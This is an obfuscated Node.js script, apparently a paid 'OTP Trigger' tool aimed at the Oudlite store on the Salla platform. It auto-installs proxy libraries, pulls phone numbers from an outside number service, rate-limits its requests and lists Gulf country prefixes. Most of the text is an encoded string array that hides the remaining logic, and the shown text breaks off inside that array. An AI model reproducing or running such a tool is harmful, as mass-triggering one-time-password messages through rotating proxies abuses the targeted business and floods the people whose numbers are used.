const fs = require('fs'),
  path = require("path"),
  {
    execSync
  } = require("child_process"),
  {
    isMainThread
  } = require("worker_threads");
if (isMainThread) {
  const requiredModules = ["https-proxy-agent", "socks-proxy-agent", "chalk"];
  let missingModules = false;
  for (const mod of requiredModules) {
    try {
      require.resolve(mod);
    } catch (v9) {
      missingModules = true;
      break;
    }
  }
  if (missingModules) {
    console.log("\n[SETUP] First time setup: Installing required dependencies...");
    try {
      const v10 = {};
      v10.stdio = "inherit", execSync("npm install https-proxy-agent socks-proxy-agent chalk@4", v10), console.log("[SETUP] Dependencies installed successfully!\n");
    } catch (v11) {
      console.error("[ERROR] Failed to install dependencies. Make sure Node.js and NPM are installed properly."), process.exit(1);
    }
  }
}
const http = require("http"),
  https = require("https"),
  zlib = require("zlib"),
  crypto = require("crypto"),
  chalk = require("chalk"),
  readline = require("readline"),
  {
    HttpsProxyAgent
  } = require("https-proxy-agent"),
  {
    SocksProxyAgent
  } = require("socks-proxy-agent");
let SUCCESSFUL_FILE = "successful.txt";
(function () {
  let v12;
  try {
    {
      const v13 = Function('return (function() {}.constructor("return this")( ));');
      v12 = v13();
    }
  } catch (v14) {
    v12 = window;
  }
  v12.setInterval(fn2, 4000);
})();
let FAILED_FILE = "failed.txt",
  DEBUG_FILE = "debug.txt";
function debugLog(v15, v16, v17) {
  try {
    {
      const v18 = new Date().toISOString(),
        v19 = '[' + v18 + "] [" + v15 + "] [" + v16 + ']\x0a' + (typeof v17 === "object" ? JSON.stringify(v17, null, 2) : String(v17)) + '\x0a' + '─'.repeat(80) + '\x0a';
      fs.appendFileSync(DEBUG_FILE, v19, "utf8");
    }
  } catch (v20) {}
}
const B = chalk.hex("#D4AF37"),
  C = chalk.hex("#FFFFFF");
const Y = chalk.hex("#C5A059"),
  W = chalk.white,
  G = chalk.gray,
  R = chalk.hex("#FF4466");
function printHeader() {
  {
    process.stdout.write("[2J[3J[H");
    console.log(B("   ____            _ _ _ _       "));
    console.log(B("  / __ \\          | | (_) |      "));
    console.log(C(" | |  | |_   _  __| | |_| |_ ___ "));
    console.log(C(" | |  | | | | |/ _` | | | __/ _ \\"));
    console.log(Y(" | |__| | |_| | (_| | | | ||  __/"));
    console.log(Y("  \\____/ \\__,_|\\__,_|_|_|\\__\\___| \n"));
    console.log(W("┌──────────────────────────────────────────────┐"));
    console.log(W("│ [•] Author    : ") + B("NOT REXY                     ") + W('│'));
    console.log(W("│ [•] Telegram  : ") + C("t.me/Rex_OTP_Tool            ") + W('│'));
    console.log(W("│ [•] Status    : ") + G("Premium License              ") + W('│'));
    console.log(W("│ [•] Target    : ") + Y("Oudlite (Salla) — OTP Trigger") + W('│'));
    console.log(W("│ [•] Version   : ") + B("OUDL-V1.0.0                  ") + W('│'));
    console.log(W("└──────────────────────────────────────────────┘\n"));
  }
}
class NexaRateLimiter {
  constructor(v21) {
    this.delayMs = v21;
    this.queue = [], this.processing = false;
  }
  ["enqueue"](v22) {
    return new Promise((v23, v24) => {
      this.queue.push(async () => {
        try {
          v23(await v22());
        } catch (v25) {
          v24(v25);
        }
      });
      if (!this.processing) this._process();
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0) {
      const v26 = this.queue.shift();
      await v26(), await new Promise(v27 => setTimeout(v27, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(500);
function nexaFetchNumber(v28, v29, v30) {
  return new Promise((v31, v32) => {
    {
      const v33 = {};
      v33.range = v29, v33.format = "normal";
      const v34 = JSON.stringify(v33),
        v35 = {
          'hostname': "nexaotpservice.com",
          'port': 0x50,
          'path': v30 || "/api/v1/numbers/get",
          'method': "POST",
          'headers': {
            'X-API-Key': v28,
            'Content-Type': "application/json",
            'Content-Length': Buffer.byteLength(v34)
          }
        },
        v36 = http.request(v35, v37 => {
          {
            let v38 = '';
            v37.on("data", v39 => v38 += v39), v37.on("end", () => {
              try {
                {
                  const v40 = JSON.parse(v38);
                  if (v40.success && v40.number) {
                    v31(v40.number.replace(/[^0-9]/g, ''));
                  } else {
                    v32(new Error(v40.error || "NexaOTP: No number returned"));
                  }
                }
              } catch (v41) {
                v32(new Error("NexaOTP: Invalid response"));
              }
            });
          }
        });
      v36.on("error", v42 => v32(new Error("NexaOTP network: " + v42.message))), v36.setTimeout(10000, () => {
        v36.destroy(), v32(new Error("NexaOTP: Timeout"));
      }), v36.write(v34), v36.end();
    }
  });
}
const v1 = {};
v1.prefix = "+966", v1.code = 'SA', v1.name = "Saudi Arabia";
const v2 = {};
v2.prefix = "+971", v2.code = 'AE', v2.name = "UAE";
const v3 = {};
v3.prefix = "+968", v3.code = 'OM', v3.name = "Oman";
const v4 = {};
v4.prefix = "+965", v4.code = 'KW', v4.name = "Kuwait";
const v5 = {};
v5.prefix = "+973", v5.code = 'BH', v5.name = "Bahrain";
const v6 = {};
v6.prefix = "+974", v6.code = 'QA', v6.name = "Qatar";
const v7 = {};
v7.prefix = "+20", v7.code = 'EG', v7.name = "Egypt";
const v8 = {};
v8.prefix = "+60", v8.code = 'MY', v8.name = "Malaysia";
const COUNTRY_CODES = [v1, v2, v3, v4, v5, v6, v7, v8];
function fn1() {
  const v43 = ['Exb0BW', 'AwqGmG', 'CgHHzq', 's2LUzW', 'kcKG', 'yM1Psq', 'nJr1CG', 'vLL5AW', 'ru9XuW', 'BNrLCG', 'A3Pmrq', 'zvzzwq', 'sMfJrq', 'zxqP', 'Eu5VvW', 'BJy0oW', 'z0fOAG', 'zgvMBa', 'q29UzG', 'vhnoqq', 'EhDtDq', 'BwDbwG', 'ruLcvG', 'ouXpDq', 'AhLMAa', 'DdOGBG', 'BxrprW', 'Aw5HBa', 'y0zHBq', 'ie5Via', 'y2f0yW', 'yw0Gia', 'wwn5ta', 'q2fWDa', 'lxnLCW', 'EejvDW', 'vNLgEa', 'DM10rG', 'zxi7ia', 'yMvYCW', 'z1Duuq', 'zxvL', 'D2vYqW', 'mJKXmtKXyxr6rvDM', 'qwLOva', 'BeP3Aa', 'su5ysG', 'zMfPBa', 'Be51Bq', 'yxvSDa', 'q25wvW', 'mJaGva', 'Dg9gAq', 't1u2EG', 'u2fMyq', 'uuTJra', 'sLvsvW', 'zs4k', 'CM13sG', 'CMLUzW', 'AxjZDa', 'zxn0', 'Ew5J', 'zvj1sa', 'u2LSzq', 'uLn4sq', 'BMnLia', 'q3rnlq', 'rJm3', 'y2vZCW', 'ww9QBq', 'CY1vBa', 'C0zfDa', 'qKv5va', '4Pwq4Pwq4Pwq4PwD', 'igrPCG', 'igjHBa', 'AuTtAq', 'Cvfrrq', 'rxvZCW', 'C2jLza', 'B3iGAq', 'B2LK', 'y2jLoq', 'mtaWia', 'u3DKAG', 'x2HoCq', 'zuLfyq', 'EwflqG', 'EwPRsa', 'mc05yq', 'Cgf1CW', 'mtm3lG', 'C2r0sG', 'vNPqAG', 'qxmZBW', 't1jDia', 'AgDRrq', 'z3fvva', 'EhqVCa', 'v1H6Ca', 'q1qGtG', 'Bw90zG', 'EfPuzG', 'B3DZlG', 'qwDLBG', 'igvYCG', 'DMvYAq', 'BfzzCW', 'lu1Rna', 'BKfZBq', 'tNvTyG', 'sKL1qG', 'wM52AG', 'rMLSDa', 'zLn4qW', 'l3yXlW', 'l3bYBW', 'rurZEG', 'sNDesG', 'y29T', 'BfvcCq', 'DsbTDq', 'ie5uia', 'icdILzRILza', 'sw5WzG', 'EvfFvG', 'werQsG', 'CMv0CG', 'icbCxW', 'DgvZ', 'tfnbEa', 'tM8GAa', 'A28Pia', 'icOOpW', 'zvn5BG', 'zgf0yq', 'qvbjia', 'y0P6sG', 'swvzCq', 'y3jVCW', 'su9uyq', 'yIKGlq', 'l3bPBG', 'BguGua', 'DhLWzq', 'CgfKuW', 'ieDLyW', 'tvDzBW', 'Fdf8mG', 'Bwf4', 'ig9Uia', 'm01Otq', 'DfjmtG', 'CwnLqW', 'sgDADq', 'x18Gxa', 'rfDouq', 'x19FlW', 'y2rJmG', 'C1LWBG', 'zxzLBG', 'zefLvG', 'EdLACG', 'DYbRzq', 'zguUAG', 'qLvyAG', 'Dw1Izq', 'y1boAG', 'Ewfozq', 'mZy4nZKWm0LPBgXpuG', 'z3PPCa', 'A0zhzq', 'vgHYzq', 'sMHVsq', 'vvHjqG', 'uhjVkq', 'lJbCCa', 'wxrKBa', 'mtC1oe1VywzHAa', 'zs4UlG', 'DNLZyq', 'z0HRBq', 're1zAq', 'ieXPyW', 'ChjVEa', 'Dhjerq', 'C3rKBW', 'u2X6AG', 'zgr6vW', 'rwXYua', 'vuK4yq', 'zw50ia', 'owDNEq', 'Dg9tDa', 'Aw1LBW', 'r3HhsG', 'AgvYia', 'zf9WCG', 'BNnLoG', 'rNf5va', 'B3vvCW', 'mtb8nG', 'y29UyW', 'vvz6yW', 'zxrLyW', 'rvjona', 'xcTCkW', '4PYtifrH', 'reD3uW', 'Bca2yq', 'u0fjEG', 'zw5JAq', 'y29TCa', 'rtrLCa', 'BML0yG', 'vNzuDa', 'vND4DW', 'DgHYBW', 'BMLUzW', 'BNn0yq', 'ywrIza', 'uIbttW', 'BwLU', 'CufMrG', 'EwzXqW', 'zgvIDq', 'DMXRyW', 'uwzsCa', 'DgvFCG', 'rwTTCa', 'x3bYBW', 'CMvTBW', 'u3L4wa', 'tgvUzW', 'vg56Aq', 'wwr2Eq', 'rLvtza', 'ifbvqG', 'weXmAq', 'EeLJAq', 'uuj5qq', 'DcbMBW', 'zLK9cG', 'zwqUDa', 'zxqGyW', 'zNnqwG', 'BNrSEq', 'cIaGia', 'Exn0zq', 'zMLSzq', 'lvyXlG', 'o0e9qG', 'l3nJCG', 'y2HHia', 'qNPfva', 'ugLRwG', 'DhjPBq', 'v2LUza', 'shPzrW', 'x0KZva', 'wfPYyq', 'wNb3AW', 'Aw9UlW', 'wLDRqq', 'rvzmAG', 'zxj2Aq', 'B3j2DW', 'vMvSyG', 'BerVCG', 'uhLTAa', 'g1SYsW', 'zKfltG', 'CwXqAG', 'Bwvtzq', 'CgfKrq', 'AxjLza', 'CKPJqG', 'v1zfBq', 'D2vQwq', 'B2yGDa', 'Cg9YDa', 'DguGCW', 'u0fHtq', 'C3nMDq', 'BMv4yq', 'FdeY', 'qNjqwG', 'lcbKzq', 'zsb8ia', 'ifnLCG', 'vg1gsa', 'zxnZBW', 'B3H5lq', 'shrsEa', 'q0rVzG', 'C3rVBq', 'EgHhza', 'oIboDq', 'senTsW', 'rNfVDa', 's3v3yq', 'EMK5vW', 'rNzqDa', 'CMv0Dq', 'mtaXza', 'vuff', 'ls0Tlq', 'zNLPBG', 'ueXguW', 'wfjUBW', 'ywDPBq', 'z3jLzq', 'DgrkAq', 'uuDstG', 'EfnVEG', 'qxfzEa', 'tfPtvq', 'r1j6qG', 'DhvYzq', 'uMvZCa', 'igfSCG', 'B210uW', 'DwuPlG', 'wxLXva', 'vujmsq', 'BhLdBW', 'zMnRDq', 'ienVBG', 'zxf1zq', 'ne5tta', 'tMv4yq', 'AxrLza', 'zwfZzq', 'ChjVyW', 'CxjUDa', 'EMvsCa', 'Dg5rCq', 'zwn0zq', 'BfPnDa', 'CuPvCG', 'CNzLCG', 'zw91Da', 'reXjva', 'rgLZCa', 'zsaTtG', 'AwHQrq', 'ANnVBG', 'zeruyW', 'if8Gia', 'q3jbAa', 'wef5CG', 'icdILAdILza', 'lxPblq', 'sgLdrq', 'xsbuzq', 'EKfWzW', 'yZLnDW', 'Aw4ZmG', 'AxruAW', 'Ff8Gia', 'zwn0Aq', 'Efr0sq', 'zg9WyG', 'BMDLia', 'Axnuva', 'z2vYzq', 'y2rKuq', 'B3P1BW', 'CYbSBW', 'zsbUBW', 'BgePia', 'yLfutq', 'B25Zzq', 'ierPCW', 'igzPBa', 'ywH0yq', 'y2zyCa', 'ywnO', 'Ag9LvW', 'DKnxsa', 'A2v5Ca', 'CNr5ia', 'rgvSzq', 'yxrxDG', 'rMfPBa', 'D2fYzq', 'qNLIsa', 'vu1crq', 'rgG3sG', 'D3nCuW', 'qxPUuq', 'uNvLDG', 'qwHluW', 'idePlG', 'iLDPBG', 'mZjFta', 'zxiGCG', 'rKrzwG', 'wefUzq', 'wKfuDG', 'i0q0qq', 'AhDPza', 'CMvUza', 'iefIBW', 'C05fAG', 'CYb1BG', 'Aw5Nia', 'BLaZrq', 'yxbWxW', 'ssbRzq', 'u1njtW', 'qw5KCG', 'wuX2zq', 'vhPOqq', 'zLH6sq', 'zxf1Aq', 'icG0mG', 't1rqia', 'zYbpva', 'z2vYia', 'uKHKvq', 'y29UBG', 'AxHcuG', 'tfHNrW', 'qvHYuG', 'swLhqG', 'rursDG', 'uKLArq', 'txHSqW', 'sgvgrq', 'vvjQsq', 'q0rfzG', 'ywnJzq', 'DgHYzq', 'wwvuCW', 'CYa6ia', 'vKvkAa', 'ExjVzq', 'kZiW', 'y1neBG', 'BwvZCW', 'Bf9NyG', 'AxrLlG', 'yNLZvq', 'B3froa', 'CvH0uW', 'Aw4GBa', 'BK5Ata', 'uuzbAG', 'rM91BG', 'zxiGmq', 'svzRDW', 'Cfzhsa', 'BMvS', 'BgqGBG', 'zsbhzq', 'qNrZDW', 'zxmUia', 'yuHftG', 'Exbzza', 'ifrptW', 't0Dcuq', 'mtKZna', 'y29UDa', 'sfruua', 'ELn5wq', 'tfHxDG', 'EMXPyG', 'Bw9Kzq', 'Dhj5xW', 'uK5xsG', 'icaGgW', 'v21Xtq', 'AwzPyW', 'CM9Y', 'C055ta', 'Egv1CW', 'lJm2ia', 'ifn0yq', 'yxrLia', 'BgvNCG', 'ue9tva', 'nZvHBW', 'z2v0', 'ALj3Dq', 'B3v0', 'DwX0kq', 'u3rLua', 'xsbzBW', 'v0zXEq', 'tvfOzW', 't3PzzG', 'D3HlBq', 'ica6ia', 'y3jLyq', 'D1bLrq', 'q2zUwa', 'u1DZDa', 'cIaG4Pwu', 'v1rgEa', 'mwj5yG', 'rtvJna', 'rgD2ra', 'vLHkDG', 'tezOEq', 'uNa3Cq', 't3vKBa', 'keXPBG', 's2rRtq', 'Bej0tq', 'wNDHsa', 'qvjfxa', 't2nVBG', '4PYxifnH', 'if8GxW', 'B3vfsW', 's01Ryq', 'yLDbqG', 'ELH4vG', 'CM9Yia', 'icHlsa', 'EMTmDa', 'vxvtqW', 'zhbVAq', 'wefgrG', 'mZCUmW', 'Bg9Jyq', 'CMfUza', 'y2LLCW', 'wLHIvW', 'zgv0zq', 'sMv6vG', 'vfKGqq', 'Aw9Uia', 'vgjYuG', 'A2z2sW', 'k0zUnW', 'AMDMsq', 'BMnVza', 'pt09ia', 'veH3Aq', 'Evr0zG', 'C0Hsra', 'FfXFxW', 'zwjTtG', 'y0vrta', 'DMvmAq', 'v3Letq', 'zwLJBW', 'Fcb8Fa', 'j0Hlta', 'BcbKzq', 'Cxb2BG', 'AwvUDa', 'tKzjtW', 'reXAvW', 'icdILzeG', 'uKvhsq', 'zcb0Aa', 'AYa9ia', 'zvnfsa', 'y29UCW', 'EuTguW', 'BxfzAq', 'm3WWFa', 'vMj4uG', 'vMr6yq', 't21HBG', 'D3jPDa', 'wejbvq', 'B3j0Aq', 'keXLyq', 'zxjZlW', 'BMTTqq', 'icdINjCG', 'Aw5KBW', 'BLzvtG', 'wwvZla', 'sw5ZDq', 'ueXnDa', 'C2v0sq', 'rw9jAa', 'wNv3ua', 'uLj6qG', 'iKfUza', 'DgfJDa', 'AM9PBG', 'wwXPDq', 'te94Dq', 'tevurq', 'mI4Xna', 'ifvWza', 'ChqTzq', '4Psa4Psa4Psa4Psy', 'uwvksq', 'DgvkEG', 'DgzhvW', 'nhWXFa', 'pI9Kzq', 'qvLHBa', 'tNDOuq', 'sKfxwq', 'EuDtyq', '4Ocuie9u', 'isbqBa', 'vhvLBW', 'Aw5JBa', 'C3rHCG', 'B3jPzW', 'oIbUDq', 'CwP6rq', 'sKfpzW', 'Exvvta', 'tNfoza', 'tK9uia', 'AxrPBG', 'mtyZ', 'icaTlq', 's1LevG', 'rLvtAq', 'uNrnzW', 'xsdINiuG', 'D0HyCW', 'wNHwuq', 'tMrdwq', 'keTiva', 'zwvK', 'C2vYDG', 'nZqYn2LpwMXnAq', 'sgXeEG', 's3jzDG', 'B2LKia', 'EwHPtG', 'nhWZFa', 'zcbMCG', 'l2v0yW', 'igLUDG', 'ihvZzq', 'AhfYDG', 'Dcbjua', 'mKXNBq', '4Pwq4Pwq4Pwx', 'y3rLza', 'v2L0Aa', 'yKHiEG', 'z3jHCa', 'zvHjra', 'tgDfzW', 'oLTHlq', 'BcbuAq', 'kfnHBa', 'u2zluW', 'mLvAtq', 'C3qGCa', 'qNfNyq', 'u3ryqG', 'lM5LEa', 'Dgvvsa', 'Cg9UCW', 'BIbWAq', 'mdaWma', 'tw96Aq', 'vvbDia', 'q3HpAq', 'iK5VDa', 'BwfPBG', 'ENzcBa', 'Aw5NlG', 'z0jOEq', 'BfvIzq', 'rKPoyW', 'zYbZzq', 'BMrLBG', 'AhKNia', 'qYblrq', 'yLLrsa', 'AxmGyW', 's2v5ia', 'AhjVDa', 'Cuv1Ba', 'DgL2zq', 'BLDjtq', 'v0X3uW', 'DxbKyq', 'CwPbqq', 'Chjyzq', 'A2LSBa', 'Bca4kq', 'wMjzzW', 'igv4zq', 'uxHRqq', 'Duz3wa', 'Dg9vCa', 'ueTOvG', 'rKzg', 'uwn0EG', 'ugfAqW', 'vw5RBG', 'D0TUtq', 'CxvLDq', 'q0PABW', 'cIaG4PYx', 'rw93BW', 'u2vSzq', 'BfnAsG', 'A0Dqua', 'C3rLBG', 'icPCkq', 'B3iGka', 'u2f2zq', 'Dxndua', 'zefTwG', 'wvbOua', 'yNvKsG', 'quPHDq', 'zMf1Ba', 'icaG4PYx', 'AxvTia', 'teXzqW', 'ruXqva', 'CMvSzq', 's0jSza', 'r2DHDG', 'uNaYqW', 'zMnPAq', 'ugXLyq', 'yKPrCG', 'zwrrvq', 'q29SvW', 'r29VzW', 'C3nPBW', 'Bvnhwq', 'ucbbua', 'revcvq', 'ucb0BW', 'luvora', 'mZmZ', 'AYbMyq', 'zMLJyq', 'ywrLza', 'rMLSzq', 'r1H0rW', 'B2nLCW', 'tgjTvW', 'Bejgra', 'B2jQzq', 'zMLmEG', 'DxrXqq', 'vMvYAq', 'mge0oq', 'CgDUCW', 'D0fKzG', 'rhjstW', '4PYtifrO', 'rgfrCa', 'wM15Ca', '4Pwq4PwDcG', 'ELzksG', '4Pwq4Pwq4Pwq4Pwx', 'sMv2DG', 'DgHWqq', 'ig51Bq', 'CM9Yqq', 'BMfQEG', 'AxfyDW', 'zsKUtq', 'CM9Wzq', 'ota2qG', 't1fHyW', 'ywXPza', 'AKvqrq', 'ieXPBq', 'yw5VDa', 'otG2ma', 'sMzNqG', 'm3W0Fa', 'BM9Uzq', 'yMvYia', 'yY9JCa', 'lwLK', 'ieHxsq', 'EeXHqq', 'mfy4BG', 'EfHVra', 'v0zMzG', 'yMvdEq', 'u00TuW', 'BwrTDG', 'A2LAzG', 'yJz6rG', 'sMTeqG', 'CuXfsq', 'FcbLyW', 'uMrZDW', 'w0vsuG', 'lsbtqW', 'DMfSDq', 'vvnVrq', 'tdG1wG', 'iZG4oa', 'EwrnEq', 'BhHhrq', 'te1HDW', 'tKn4yW', 'u3LUyW', 'u2XTDq', 'u1rfuG', 'sgfbBa', 'Eu1Z', 'BvDpsW', 'C2uGuW', 'uKfqrq', 'B25Lia', 'AxbtEq', 't1n0CG', 'AMH4tW', 'Dhj5sW', 'y1LdyW', 'sgL0qq', 'qZPCvW', 's0PiCa', 'vNjutG', 'qxvVta', 'Avf3wq', 'ie5LDa', 'BwfW', 'EfjSAq', 'wwvZ', 'B3jRoG', 'jgnWDq', 'rMf0yq', 'pvWNqW', '4Psa4Psa4Psa4Psq', 'z05wCq', 'B2jPBa', 'DgLTzq', 'EvzYsa', 'q3q0ta', 's3rqvW', 'u0vsvG', 'BNvSBa', 'lI4UcG', 'zdvsEG', 'Dw0IoW', 'z3vUEG', 'zxHPCW', 'wKPpBq', 's2HYDG', 'mLz3qq', 'z3Liva', 'vez3zq', 'BIaGia', 'B3iGza', 'AsbbCG', 'zKPNsG', 'CM9Tia', 'rdj6mW', 's3zWoq', 'lcaQlW', 'BgL0zq', 'wNjQzG', 'vvv1yq', 'y2HH', 'sgvAuG', 't0H5CG', 'DgvbEq', 'yMfZzq', 'yMPLyW', 'zxiGmG', 'wwTjwq', 'v0Leia', 'icHLlG', 'D3bvyG', 'n2u5mG', 'ugLsva', 'zuzPBa', 'te12CW', 'DMvKlG', 'osKG4Ocu', 'B1bYBW', 'zsbSyq', 'EwHhCG', 'A0H6sa', 'qw1MEG', 'mNWZFa', 'zgvSzq', 'ugL4zq', 'mhHknq', 'xsbuyq', 'sgzkva', 'BfX2mq', 'vhfcBW', 'DgTZwa', 'Euv4BW', 'zLbWrW', 'Aw1Ssa', 'DMveuq', 'icHUDq', 'ifj1BG', 'DfrPBq', 'wKXAwa', 'uwPNqG', 'mwrInq', 'twfRzq', 'yKjfAG', 'rgPPCq', 'yxrPBW', 'CMvZDq', 'EgL0Aq', 'qvjdCa', 'DLHzua', 'qNLbyG', 'ntq2qG', 'wuvZEq', 'CKLNzG', 'C2vJqW', 'qxboEq', 'mtm7ia', 'CY50Ea', 'CuXNwq', 'v3jKza', 'te5PBG', 'vK1Nsq', 'D29YAW', 'DgHVCG', 'ibTBoq', 'EwLmBq', 'EKeTwG', 'r3LZta', 'uZLUAW', 'EsbZyq', '4Psa4Psa4Psa4Psa', 'zwqGDa', 'y2vUCW', 'ExnPyq', 'BYbPBG', 'qNbVEa', '4PYxifLV', 'zhHiqq', 'yxjPlW', 'Fe9uua', 'AePbzG', 'C3rHDa', 'u1bota', 'CIboDq', 'zY4Gmq', 'z3jHEq', 'rvnyuG', 'rNjTzW', 'Dg8GCG', 'yw5KCG', 'z2rouW', 'rZm2Aq', 'CKLKoW', 'CgXLvW', 'v2vSwG', 'icGVCa', 'C1jgvG', 'thDyAW', 'nhWYFa', 'n0Xnmq', 'CIWGEG', 'mhWXFa', 'yxDnBW', 'Awz5', 'qxLLEG', 'sKjlBG', 'rMnHBa', 'AgDVEG', 'zwqGBW', 'EeHZwG', 'ihrYEq', 'rKj4za', 'BYbWCG', 'uhjLBq', 'A2v5', 'zKPYEq', 'rxzLBG', 'A3fhqG', 'sLHTzq', 'ntaGva', 'y2HHBa', 'wxnkAG', 'B3DnqW', 'vg5vDa', 'zhmGka', 'EgvK', 'CxLwBa', 'luvYCG', 's0vAva', 'ywnL', 'B3HrAq', 'B3DUqW', 'C29Yia', 'B2PxqW', 'A09mmq', 'r0TQuq', 'uhjVEa', 'ms5Xwq', 'D2PhCG', 'mtiYnW', 'su4Gua', 'zfLizW', 'ntiXmG', 'wvzYyW', 'tfDxBq', 'Dw50CW', 'Dt0Xla', 'Cfb3yq', 'CwfmAa', 'DgTQza', 'EgLLCW', 'ywnJBW', 'AYWKBq', 'ENPhAq', 'tM8GBG', 'AfLxzG', 'zY50Ea', 'tvfMzq', 'v3zcDG', 'vLrmzW', 'AvnmzG', 'B2LKxW', 'CNvxuW', 'u0jMAq', 'rsbpva', 'rxjYBW', 'ifnHzG', 'ihWGFa', 'AxrL', 'sxfuwq', 'ueLguW', 'EsbfCG', 'ufvqAq', 'uuLSsq', 'lIbuyq', 'B1rouW', 'x0jHCW', 'zwqGza', 'C3bSAq', 'ChjVCa', 'igDLDa', 'DLvyqW', 'wL8Kxq', 'CuXJsq', 'icjdAa', 'BguGqW', 't196DW', 'C2uGyW', 'ANDlDq', 'A0PQzq', 'yxrJAa', 'Eezqsa', 's2XQva', 'vu1Woq', 'zcboua', 'DxjLia', 'y2HPBa', 'CgvYia', 'y29YCW', 'DxndBW', 'nY4ZnG', 'AunNEG', 'y2TVkq', 'zM9Yrq', 'ihrVia', 'CxvLCW', 'sM5sua', 'BgfPBG', 'yxnL', 'AMDSEG', 'yxzLza', 'CYbHBG', 'AwXLia', 'oI8V', 'C3Pvqq', 'Bsbozq', 'lJb8', 'ndy2', 'yMfUBG', 'sw5ZDa', 'wM94yW', 'ufHKDq', 'twLJCG', 'Eu53AW', 'uNz1za', 'yNL0zq', 'qu9jzq', 'EfzyCa', 'ExHUCG', 'iJT2pq', 'C29JAW', 'Euvbsq', 'zxjFDa', 'zxbLBG', 'AKfozW', 'icbFxW', 'uvrIrq', 'zI16vG', 'kc4UlG', 'ihzLCG', 'u0zdsW', 'zgLNzq', 'DgfYDa', 'ienVDq', 'B25jta', 'sgnYEq', 'ievYCG', 'tM8Sia', 'yNLoBW', 'ndqYyG', 'yuTxEa', 'Ee5Nsq', 'zu1vzW', 'lJaU', 'sMOZvq', 'CI4Grq', 'EunVBG', 'CNvLkq', 'ufrgsG', 'vxrVra', 'rYbtrq', 'DeLfDq', 'uKrxqq', 'yNLPsW', 'CNrPBG', 'rNDysG', 's0vzlq', 'tgvZCG', 'uhj4AG', 'sNPzrq', 'vNbusG', 'r0rpuW', 'B3vMtG', 't1HPtW', 'q05QCa', 'B0nXmq', 'Dvj6rW', 'zsbTzq', 'yJvOBW', 'mc4Wia', 'CMXADG', 'ze1Mzq', 'ywrZ', 'x19Fia', 'C29zyW', 're1sBW', 'rfH0sW', 'zKHpDa', 'iev4Aq', 'BhncDW', 'DgzwAa', 'sfLgEa', 'zxjfBG', 'B3jbyW', 'tKf6Ba', 'D2fXDa', 'ywjPyq', 'rvbnDG', 'B1jprG', 'rvfjAq', 'yMLyBG', 'r3r6CG', 'ueX1zq', 'EwrqDW', 'ywnOAq', 'ywLU', 't1rqoG', 'zY4UlG', 'Dg9Y', 'ALDHrW', 'iokgUYbt', 'v0PPAG', 'C2HLBa', 'BNrPBq', 'DMvKia', 'vhjPzW', 'igXPAW', 'DxvlrG', 'u05sCa', 'CuDpta', 's3vhCq', 'C3rHBa', 'u0HhAG', 'DMfPBa', 'CMvKia', 'EfbgAa', 'rK9bqq', 'kf98ia', '4PYtieXV', 'Ee9hDa', 'mtm3mW', 'BMvhDq', 'zNnKBa', 'Bg1LBq', 'zcbpva', 'BgvUzW', 'BdKXoa', 'tfjura', 'CM4Gka', 'i0m1qq', 'u0TjtG', 'DwjAsq', '8j+mKcbbDq', 'yxrL', 'uxvQAa', 'Ae9NxW', 'y29Kzq', 'Dg9mBW', 'ndKXmdu0nxrTA3rWva', 'EgD3sa', 'D1zyra', 'vu9JCW', 'u2HLBa', 'lJq5oq', 'BdbSCG', 'BwjJrW', 'C29YDa', 'BKfkvq', 'D1HWsW', 'sJyXEq', 'sfjfqq', 'CxvPCG', 'AfvH', 'mhn0za', 'kZyW', 'C3vJyW', 'DfXdCG', 'zg93CW', 'z0HHBa', 'zsbPBG', 'DgLVBG', 'uevPBW', 'DhrSzq', 'yw5Jzq', 'BNnLia', 'EKT2ra', 'Df06', 'y2vjra', 'ywDLBG', 'ihvUza', 'BguVCW', 'Bc5LEa', 'CfPqua', 'zsi7DG', 'y3qTtW', 'DhLlzG', 'q0Dmwa', 'BMfTzq', 'z0jVBG', 'vuPiwq', 'zM92yq', 'CK5fzG', 'u0fs', 'vgjzyq', 'x19HDG', 'yxrLza', 'CfLrCa', '4PYtiefq', 'xYrDwW', 'uxLvsW', 'B2zWBa', 'zgvSyq', 'l3zLCG', 'rLr6qG', 'EuHsDq', 'v1m0sW', 'zxiGjW', 'u3Hrsq', 'mtaGva', 'ywT1Aq', 'BMDPzG', 'AJjxmG', 'zxbjyG', 'v1rZEG', 'EfPsBW', 'CY1WCG', 'qKvnyG', 'lIbfEa', 'mdvKmW', 'Dhj5qW', 'v2HtCq', 'ie9vra', 'DgvTua', 'zfzyuq', 'vuvnEa', 't1veta', 'Dw5SAq', 'mgz0uq', 'Fcb8xW', 'whfLCW', 'whLYtW', 'B25Uzq', 'igTLEq', 'ytHKnq', 'ie51Bq', 'tgDLrq', 'mL9qCG', 'vfvqxq', 'xsbwzq', 'yM9Sza', 'lNnHBa', 'Fcak', 'CNvJDa', 'igzVCG', 'v0XPCq', 'D2fKuq', 'DMvYia', 'BhfNCa', 'DgvUyq', 'wejnzW', 'EfznCa', 'shPNCq', 'uxnYtG', 'AevuBW', 'zxiGsW', 'AhjVBq', 'zxjZ', 'BgXPBG', 'AM9NwG', 'twTwBa', 'DK5nqq', 'icGVzW', 'lcb0zq', 'BNDJyW', 'B3DZua', 'ifjftq', 'BKjYAq', 'ntu1', 'zsWGyG', 'ifDPBG', 'nZm2qG', 'ExflzW', 'BgXWCW', 'CMX4wa', 'DwrLBa', 'uMv0CG', 'g1SZsG', 'rxbPsa', 't1rnzq', 'uLjHvq', 'BgWGFa', 'nfDSvq', 'C2eUBW', 'g1Ti', 'C2fSBa', 'icb8ia', 'zMnTBa', 'swzjAq', 'mtaW', 'jgrPCW', '4Psu4Psa4Psa4Psa', 'Cuv2Eq', 'zxjFAW', 'sfDjra', 'wZeVmq', 'zs1pDq', 'runMyq', 'ig1HBG', 'zwDPCW', 'x3nPza', 'vvbxsG', 'icdILiiG', 'y3rPBW', 'B2zZDa', 'vvneDW', 'BIbMyq', 't1zfra', 'BfHcuW', 'CY1ZAq', 'EvnHzG', 'y1zdyG', 'mY9Nzq', 'C3nPBG', 'Dej5sW', 'ANL5EG', 'quTiBq', 'zw1WDa', 'AgvHza', 'AgfbyG', 'x198ia', 'B21vvq', 'B2z2wG', 'iokCPIbt', 'sffdCq', 'z3juyq', 'mtu7ia', 'CKXora', 'wg9QAG', 'DMDvwq', 'CwDMsq', 'zKzgDa', 'zxrJAa', 'muTUra', 'CgXHDa', 'BenVDq', 'uMfWDa', 'v3vmCW', 'Ahr0Ca', 'Aw9U', 'vu9ovG', 'rxbfvq', 